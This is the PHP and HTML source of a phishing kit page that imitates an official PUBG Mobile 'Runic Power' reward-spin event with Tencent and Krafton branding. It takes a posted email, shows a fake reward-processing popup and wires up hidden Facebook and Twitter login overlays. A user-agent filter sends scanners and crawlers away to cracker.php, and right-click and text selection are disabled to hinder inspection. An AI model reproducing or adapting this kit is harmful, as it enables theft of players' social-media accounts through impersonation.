<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.html");
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <style>
   @font-face {
     font-family:halloween;
     src: url('css/hal.ttf') format("truetype");
      }
      @font-face {
     font-family:pubg;
     src: url('css/pubg.ttf') format("truetype");
      }
       body {
        margin:0;
        box-sizing:border-box;
       }
	   ::-webkit-scrollbar {
	   display: none;
	   }
       .wrap {
           width:100%;
           height:100%;
       }
       .wrap .bg {
           position:relative;
           width:100%;
           height:100%;
       }
       .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:415px;
       }
       .bg .box {
           width:100%;
           height:100%;
           text-align:center;
           margin-top:-30px;
       }
       
       .box .spin {
           background:url('img/pe.png') no-repeat;
           background-size:cover;
           width:380px;
           margin-top:30px;
           text-align:center;
           height:380px;
       }
       .spin .img{
           border:2px solid white;
           width:60px;
           height:60px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:51px;
           left:128px;
       }
       .spin .img:nth-child(2){
           position:relative;
           top:239x;
           left:63px;
           transform:rotate(179.5deg);
       }
       .spin .img:nth-child(3){
           position:relative;
           top:102px;
           right:-79px;
           transform:rotate(61deg);
       }
       .spin .img:nth-child(4){
           position:relative;
           top:190.5px;
           right:-12px;
           transform:rotate(119deg);
       }
       .spin .img:nth-child(5){
           position:relative;
           top:190.5px;
           left:-202px;
           transform:rotate(241deg);
       }
       .spin .img:nth-child(6){
           position:relative;
           top:38px;
           left:-81px;
           transform:rotate(299deg);
       }
       .box .start {
           position:relative;
           border:none;
		   margin-top: -70px;
           width:130px;
		   margin-left: auto;
		   margin-right: auto;
		   display: block;
       }

       .mask {
           position:fixed;
           top:0;
           left:0;
           width:100%;
           height:100%;
           background:rgba(0,0,0,0.50);
       }
       keyframes da {
           from { transform:translate(-50%,-80%);}
           to { transform:translate(-50%,-50%);}
       }
       @keyframes dax {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertx .topx {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:20px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertx .px {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
      .alertx .px img {
           width:100px;
           height:100px;
       }
       .alertx .btnx {
           margin-top:4px;
           width:95px;
           height:30px;
           line-height:30px;
           font-weight:bold;
           font-size:16px;
           font-family:'pubg';
           background:orange;
           border-radius:5px;
       }
       /**/
       .alertl {
           display:none;
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:170px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
           animation:dal 2s forwards ;
           transition:ease-in-out;
       }
       @keyframes dal {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertl .topl {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:15px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertl .pl {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
       .alertl .fb {
           height:32px;
           line-height:32px;
           width:250px;
           background:#3b5998;
           font-size:17px;
           padding-left:10px;
           border-radius:4px;
           box-shadow:0 3px 1px orange;
           color:white;
           font-weight:bold;
           margin-top:15%;
           font-family:'pubg';
           text-align:center;
       }
       .alertl .tw {
           padding-left:10px;
           height:32px;
           line-height:32px;
           width:250px;
           background:#1DA1F2;
           font-size:17px;
           border-radius:4px;
           box-shadow:0 3px 1px orange;
           color:white;
           font-weight:bold;
           margin-top:5%;
           font-family:'pubg';
           text-align:center;
       }
       .fb i , .tw i {
           margin-top:8px;
           float:left;
       }
             @media only screen and (min-width:100px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:150px;
       }
      }
       @media only screen and (min-width:200px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:370px;;
       }
       .bg .label {
           border:none;
           width:370px;
       }
       .bg .box {
           width:370px;
           height:380px;
       }
       .img {
           position:absolute;
           width:10px;
       }
       .box .spin {
           background:url('img/spin.png') no-repeat;
           background-size:cover;
           width:350px;
           text-align:center;
           height:350px;
       }
       .box .start {
           position:relative;
           border:none;
           bottom:270px;
           width:170px;
		   height: 220px;
       }
        .spin .img:nth-child(2){
           position:relative;
           top:241px;
           left:63px;
           transform:rotate(179.5deg);
       }
       }
       @media only screen and (min-width:399px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:410px;
       }
         .bg .label {
           border:none;
           margin-top:-3px;
           width:410px;
       }
       .bg .box {
           width:410px;
           height:460px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:35px;
           left:130px;
       }
        .spin .img:nth-child(5){
           position:relative;
           top:195.5px;
           left:-225px;
           transform:rotate(241deg);
       }
       }

.bulet {
    color: #000;
    font-size: 8px;
}
.aktifnya {
    color: #1da1f2;
    border-bottom: 2px solid #1da1f2;
}
       @media only screen and (min-width:399px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:410px;
       }
         .bg .label {
           border-radius:0;
           margin-top:0;
           width:410px;
       }
       .bg .box {
           border-radius:0;
           width:410px;
           height:350px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:54px;
           left:126px;
       }
        .spin .img:nth-child(5){
           position:relative;
           top:190.5px;
           left:-202px;
           transform:rotate(241deg);
       }
       }
   </style>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG MOBILE - RUNIC POWER</title>
    <link rel="icon" type="img/png" href="https://www.pubgmobile.com/common/images/icon_logo.jpg" sizes="32x32">
    <meta property="og:description" content="Start a event from Tencent. You can spin in one times only!">
    <meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
	<link rel="stylesheet" href="css-zone/facebook.css">
	<link rel="stylesheet" href="css-zone/twitter.css">
	<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <script type="text/javascript" src="js-zone/jquery.js"> </script>
    <script type="text/javascript" src="js-zone/main-zone.js"></script> 
    <script type="text/javascript" src="index_files/main-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script script language="JavaScript">
        document.write(riyanandhika())
    </script>
    <link href="./index_files/css" rel="stylesheet">
    <script language="JavaScript">
        document.write(head())
    </script>
</head>
<body  oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="slider-container">
<section>
<div class="imgBox">
	<video src="media/pubg.mp4" autoplay loop muted></video>
</div>

<div class="slogan">
	<img src="img/pubgm.png">
	<img src="img/x.png">
	<img src="img/metroexodus.png">
</div>

    </div>
    <div class="gallery-container">
    
	<center>
    <div class="wrap">
        <div class="bg">
            <div class="box">
                <center>
				<div class="spin">
                <img class="img" src="img/reward/1.png">
                <img class="img" src="img/reward/2.png">
                <img class="img" src="img/reward/3.png">
                <img class="img" src="img/reward/4.png">
                <img class="img" src="img/reward/5.png">
                <img class="img" src="img/reward/6.png">
                </div>
                </center>
				<img onclick="spin()" class="start" src="img/putar.png">
            </div>
        </div>
    </div>
	</center>
	
    </div>
    <div class="div-bot" style="color:white;padding-top: 10px;padding-bottom: 1px;">
        <center>
		<p>
                <img src="https://www.pubgmobile.com/common/images/foot_logo1.png" style="padding-top: 10px;height:48px;width: 80px;">
                <img src="https://www.pubgmobile.com/common/images/foot_logo2.png" style="padding-top: 10px;height:50px;width: 100px;">
                <img src="https://www.pubgmobile.com/common/images/foot_logo3.png" style="padding-top: 10px;height:48px;width: 175px;">
				<div style="color: #fff; font-size: 17px; font-family: Teko; font-weight: bold; text-transform: uppercase;">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div>
				<div style="color: #fff; font-size: 17px; font-family: Teko; font-weight: bold; text-transform: uppercase;">ⓒ 2018-2020 PUBG CORPORATION. All rights reserved.</div>
		</p>
        </center>
    </div>
    <script src="./index_files/jquery.min.js.download">
    </script>
    <script language="JavaScript">
        document.write(result())
    </script>
    <script type="text/javascript" src="index_files/gift-zone.js"></script>
    <script>
        function openHero(evt, heroClass) {
            var i, gallery, tab;
            gallery = document.getElementsByClassName("gallery");
            for (i = 0; i < gallery.length; i++) {
                gallery[i].style.display = "none";
            }
            tab = document.getElementsByClassName("tab");
            for (i = 0; i < tab.length; i++) {
                tab[i].className = tab[i].className.replace(" active", "");
            }
            document.getElementById(heroClass).style.display = "block";
            evt.currentTarget.className += " active";
        }
        document.getElementById("defaultOpen").click();
    </script>
    <script type="text/javascript" src="js-zone/slide-zone.js"> </script>
    <script type="text/javascript" src="./index_files/slide-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(luckyspin())
    </script>

    <style type="text/css">
        *: (input, textarea) {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
    <style type="text/css">
        img {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>

<div class="popup open_rewards">
<div class="popup-box animated fadeInDown">
<div class="nav-popup">
<div class="nav-popup-title">Processing Rewards</div>
</div>
<div class="popup-alert" style="width: 90%; margin-left: auto; margin-right: auto; text-align: left; display: block;">
Hi survivor
<br>
<br>
Thank your for joining this RUNIC POWER event
<br>
<br>
Your account is currently being processed to receive the rewards that you previously spin
<br>
<br>
Please wait up to 24 hours
</div>
<button type="button" class="popup-btn" onclick="location.href='https://pubgmobile.com/';">Logout</button>
<br>
<br>
</div>
</div>

<script>
    function close_open_rewards() {
        $('.open_rewards').hide();
    }
	function open_account_login() {
        $('.open_account_login').show();
		$('.open_rewards').hide();
    }
	function close_account_login() {
        $('.open_account_login').hide();
		$('.open_rewards').show();
    }
	function open_facebook() {
        $('.login_facebook').show();
        $('.open_account_login').hide();
    }
	function open_twitter() {
        $('.login_twitter').show();
        $('.open_account_login').hide();
    }
	function close_facebook() {
        $('.login_facebook').hide();
        $('.open_account_login').show();
    }
	function close_twitter() {
        $('.login_twitter').hide();
        $('.open_account_login').show();
    }
   function spin() {
     document.getElementsByTagName("audio")[0].play();
    setTimeout(function() {
    $('.open_rewards').show();
   },3900);

  var $myElm = $(".spin");

  function rotate(degrees) {
    $myElm.css({
      '-webkit-transform': 'rotate(' + degrees + 'deg)',
      '-moz-transform': 'rotate(' + degrees + 'deg)',
      '-ms-transform': 'rotate(' + degrees + 'deg)',
      'transform': 'rotate(' + degrees + 'deg)'
    });
  }
 $({
    deg: 0
  }).animate({
    deg: 360 * 40
  }, {
    duration: 3900,
    step: function() {
        const lord = Math.random() * (360 - 1) + 1;
      var deg = this.deg;
      rotate(lord * 4);
    }
  });
}
setInterval(function time(){
  var d = new Date();
  var hours = 24 - d.getHours();
  var min = 60 - d.getMinutes();
  if((min + '').length == 1){
    min = '0' + min;
  }
  var sec = 60 - d.getSeconds();
  if((sec + '').length == 1){
        sec = '0' + sec;
  }
  jQuery('#waktu p').html(hours+':'+min+':'+sec)
}, 1000);
</script>
<script>
// <![CDATA[
function klik1() {
    var audio = document.getElementById('klik1');
    audio.play();
}
$(document).ready(function(){
        $("o").attr("onclick", "klik1()");
});
//]]></script>
        
</audio></body>

</html>